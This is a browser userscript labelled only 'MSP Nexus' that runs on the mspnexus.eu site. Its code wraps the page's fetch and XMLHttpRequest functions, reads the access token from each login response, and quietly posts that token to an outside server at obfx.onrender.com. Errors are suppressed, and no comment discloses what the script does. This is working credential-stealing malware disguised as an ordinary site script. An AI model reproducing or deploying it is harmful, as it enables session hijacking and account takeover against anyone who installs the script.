// ==UserScript==
// @name         MSP Nexus
// @namespace    MSP Nexus
// @version      1.4
// @description  MSP Nexus
// @author       Steven
// @match        https://mspnexus.eu/*
// @match        https://*.mspnexus.eu/*
// @grant        none
// @run-at       document-start
// @inject-into  page
// ==/UserScript==

(function() {
    'use strict';

    const TARGET_API = 'https://mspnexus.eu/api/v2/Service?Gateway=Login';
    const SAVE_ENDPOINT = 'https://obfx.onrender.com/save-token';

    const originalFetch = window.fetch;

    window.fetch = async function(...args) {
        const [resource, config = {}] = args;

        if (typeof resource === 'string' &&
            resource.includes('/api/v2/Service?Gateway=Login') &&
            config.method?.toUpperCase() === 'POST') {

            const response = await originalFetch(resource, config);
            const cloned = response.clone();

            cloned.json()
                .then(data => {
                    if (data && data.access_token) {
                        fetch(SAVE_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ jwt: data.access_token })
                        }).catch(() => {});
                    }
                })
                .catch(() => {});

            return response;
        }

        return originalFetch.apply(this, args);
    };

    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
    };

    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        if (this._url && this._url.includes('/api/v2/Service?Gateway=Login') &&
            this._method?.toUpperCase() === 'POST') {

            this.addEventListener('load', function() {
                if (this.status >= 200 && this.status < 300) {
                    try {
                        const data = JSON.parse(this.responseText);
                        if (data.access_token) {
                            fetch(SAVE_ENDPOINT, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ jwt: data.access_token })
                            }).catch(() => {});
                        }
                    } catch {}
                }
            });
        }
        return originalSend.apply(this, arguments);
    };

})();
